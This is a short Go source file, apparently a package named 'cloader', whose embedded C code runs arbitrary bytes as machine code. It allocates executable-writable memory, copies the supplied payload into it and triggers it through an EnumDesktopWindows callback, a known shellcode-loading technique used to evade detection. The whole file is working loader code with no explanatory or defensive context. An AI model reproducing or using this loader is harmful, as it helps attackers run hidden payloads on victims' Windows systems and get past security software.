package cloader

/*
#include <windows.h>

void enumDesktopWindows(uintptr_t p, int len) {
    LPVOID addr = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (addr) {
        RtlMoveMemory(addr, (void*)p, len);
        EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()), (WNDENUMPROC)addr, 0);
        VirtualFree(addr, 0, MEM_RELEASE);
    }
}
*/
import "C"
import "unsafe"

func EnumDesktopWindows(p []byte) {
	C.enumDesktopWindows((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
